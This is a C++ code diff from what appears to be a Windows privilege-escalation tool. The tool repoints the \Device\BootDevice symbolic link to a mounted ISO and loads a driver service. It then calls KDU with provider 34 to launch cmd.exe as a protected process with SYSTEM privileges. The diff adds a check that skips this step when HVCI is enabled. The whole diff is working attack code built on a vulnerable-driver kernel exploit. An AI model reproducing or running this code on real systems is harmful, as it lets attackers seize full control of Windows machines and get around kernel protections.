@@ -16,6 +16,11 @@ int main(int argc, char* argv[]) {
 	int drvx_len = 0;
 	int drv64_len = 0;
 	int kdu_len = 0;
+
+	// HVCI State
+	BOOLEAN bHVCIEnabled = FALSE;
+	BOOLEAN bHVCIStrictMode = FALSE;
+	BOOLEAN bHVCIIUMEnabled = FALSE;
 	
 	// Overwrite result
 	BOOL bSuccess = FALSE;
@@ -134,7 +139,7 @@ int main(int argc, char* argv[]) {
 	printf("(+) Old target: %ws\n", oldTarget.c_str());
 	printf("(+) New target: %ws\n", physicalDrivePath);
 
-	// change the symbolic link to make it point to the UEFI partition (\Device\HarddiskVolume1)
+	// change the symbolic link to make it point to the ISO (\Device\CdRomX)
 	auto status = ChangeSymlink(L"\\Device\\BootDevice", wDevicePath);
 
 	if (status == STATUS_SUCCESS) std::cout << "(+) Successfully changed symbolic link to new target!\n";
@@ -170,19 +175,29 @@ int main(int argc, char* argv[]) {
 		return 1;
 	}
 
-	// We now have shift back to E:
-	std::string cmdLine = std::string("start \"\" cmd /c ");
-	cmdLine.append(fullKduPath);
-	cmdLine.append(" -prv 34 -pse C:\\Windows\\System32\\cmd.exe");
+	QueryHvciInfo(&bHVCIEnabled, &bHVCIStrictMode, &bHVCIIUMEnabled);
 	
-	printf("(*) Executing: %s\r\n", cmdLine.c_str());
+	if (bHVCIEnabled) {
+		printf("(-) HVCI is Enabled, KDU will not work. Please switch to an HVCI compliant solution.\n");
+	}
+	else {
+		printf("(+) HVCI is not enabled, KDU will work.\n");
 
+		// We now have shift back to E:
+		//std::string cmdLine = std::string("start \"\" cmd /c ");
+		std::string cmdLine = std::string("");
+		cmdLine.append(fullKduPath);
+		cmdLine.append(" -prv 34 -pse C:\\Windows\\System32\\cmd.exe");
+
+		printf("(*) Executing: %s\r\n", cmdLine.c_str());
+
+		// Using KDU to launch a PPL process with SYSTEM privileges
+		system(cmdLine.c_str());
+
+	}
+	printf("(+) Finished. Press a button to cleanup and exit.");
 	getchar();
 
-	// Using KDU to launch a PPL process with SYSTEM privileges
-	system(cmdLine.c_str());
-
-	Sleep(5000);
 	// Stop the service to free the driver
 	DoStopSvc(DRIVER_SERVICE_NAME);
 	// Unmount the ISO
